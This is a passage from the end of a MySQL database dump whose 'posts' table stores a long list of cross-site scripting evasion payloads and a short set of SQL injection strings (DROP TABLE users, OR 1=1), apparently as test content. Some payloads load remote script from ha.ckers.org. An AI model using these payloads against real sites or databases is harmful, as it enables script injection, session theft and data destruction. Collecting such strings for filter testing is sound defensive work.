\\x20onerror=javascript:alert(1)>\n\"`\'><script>\\x3Bjavascript:alert(1)</script>\n\"`\'><script>\\x0Djavascript:alert(1)</script>\n\"`\'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x81javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x84javascript:alert(1)</script>\n\"`\'><script>\\xE3\\x80\\x80javascript:alert(1)</script>\n\"`\'><script>\\x09javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x89javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x85javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x88javascript:alert(1)</script>\n\"`\'><script>\\x00javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>\n\"`\'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>\n\"`\'><script>\\x0Cjavascript:alert(1)</script>\n\"`\'><script>\\x2Bjavascript:alert(1)</script>\n\"`\'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>\n\"`\'><script>-javascript:alert(1)</script>\n\"`\'><script>\\x0Ajavascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>\n\"`\'><script>\\x7Ejavascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x87javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>\n\"`\'><script>\\xC2\\x85javascript:alert(1)</script>\n\"`\'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x83javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>\n\"`\'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x80javascript:alert(1)</script>\n\"`\'><script>\\x21javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x82javascript:alert(1)</script>\n\"`\'><script>\\xE2\\x80\\x86javascript:alert(1)</script>\n\"`\'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>\n\"`\'><script>\\x0Bjavascript:alert(1)</script>\n\"`\'><script>\\x20javascript:alert(1)</script>\n\"`\'><script>\\xC2\\xA0javascript:alert(1)</script>\n<img \\x00src=x onerror=\"alert(1)\">\n<img \\x47src=x onerror=\"javascript:alert(1)\">\n<img \\x11src=x onerror=\"javascript:alert(1)\">\n<img \\x12src=x onerror=\"javascript:alert(1)\">\n<img\\x47src=x onerror=\"javascript:alert(1)\">\n<img\\x10src=x onerror=\"javascript:alert(1)\">\n<img\\x13src=x onerror=\"javascript:alert(1)\">\n<img\\x32src=x onerror=\"javascript:alert(1)\">\n<img\\x47src=x onerror=\"javascript:alert(1)\">\n<img\\x11src=x onerror=\"javascript:alert(1)\">\n<img \\x47src=x onerror=\"javascript:alert(1)\">\n<img \\x34src=x onerror=\"javascript:alert(1)\">\n<img \\x39src=x onerror=\"javascript:alert(1)\">\n<img \\x00src=x onerror=\"javascript:alert(1)\">\n<img src\\x09=x onerror=\"javascript:alert(1)\">\n<img src\\x10=x onerror=\"javascript:alert(1)\">\n<img src\\x13=x onerror=\"javascript:alert(1)\">\n<img src\\x32=x onerror=\"javascript:alert(1)\">\n<img src\\x12=x onerror=\"javascript:alert(1)\">\n<img src\\x11=x onerror=\"javascript:alert(1)\">\n<img src\\x00=x onerror=\"javascript:alert(1)\">\n<img src\\x47=x onerror=\"javascript:alert(1)\">\n<img src=x\\x09onerror=\"javascript:alert(1)\">\n<img src=x\\x10onerror=\"javascript:alert(1)\">\n<img src=x\\x11onerror=\"javascript:alert(1)\">\n<img src=x\\x12onerror=\"javascript:alert(1)\">\n<img src=x\\x13onerror=\"javascript:alert(1)\">\n<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">\n<img src=x onerror=\\x09\"javascript:alert(1)\">\n<img src=x onerror=\\x10\"javascript:alert(1)\">\n<img src=x onerror=\\x11\"javascript:alert(1)\">\n<img src=x onerror=\\x12\"javascript:alert(1)\">\n<img src=x onerror=\\x32\"javascript:alert(1)\">\n<img src=x onerror=\\x00\"javascript:alert(1)\">\n<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>\n<img src=\"x` `<script>javascript:alert(1)</script>\"` `>\n<img src onerror /\" \'\"= alt=javascript:alert(1)//\">\n<title onpropertychange=javascript:alert(1)></title><title title=>\n<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">\n<!--[if]><script>javascript:alert(1)</script -->\n<!--[if<img src=x onerror=javascript:alert(1)//]> -->\n<script src=\"/\\%(jscript)s\"></script>\n<script src=\"\\\\%(jscript)s\"></script>\n<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\n<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n<IMG SRC=# onmouseover=\"alert(\'xxs\')\">\n<IMG SRC= onmouseover=\"alert(\'xxs\')\">\n<IMG onmouseover=\"alert(\'xxs\')\">\n<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\n<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n<IMG SRC=\"jav   ascript:alert(\'XSS\');\">\n<IMG SRC=\"jav&#x09;ascript:alert(\'XSS\');\">\n<IMG SRC=\"jav&#x0A;ascript:alert(\'XSS\');\">\n<IMG SRC=\"jav&#x0D;ascript:alert(\'XSS\');\">\nperl -e \'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";\' > out\n<IMG SRC=\" &#14;  javascript:alert(\'XSS\');\">\n<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\n<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >\n<SCRIPT SRC=//ha.ckers.org/.j>\n<IMG SRC=\"javascript:alert(\'XSS\')\"\n<iframe src=http://ha.ckers.org/scriptlet.html <\n\\\";alert(\'XSS\');//\n<u oncopy=alert()> Copy me</u>\n<i onwheel=alert(1)> Scroll over me </i>\n<plaintext>\nhttp://a/%%30%30\n</textarea><script>alert(123)</script>'),(23,'SQL Injection','1;DROP TABLE users\n1\'; DROP TABLE users-- 1\n\' OR 1=1 -- 1\n\' OR \'1\'=\'1');
/*!40000 ALTER TABLE `posts` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-01-22 12:40:37
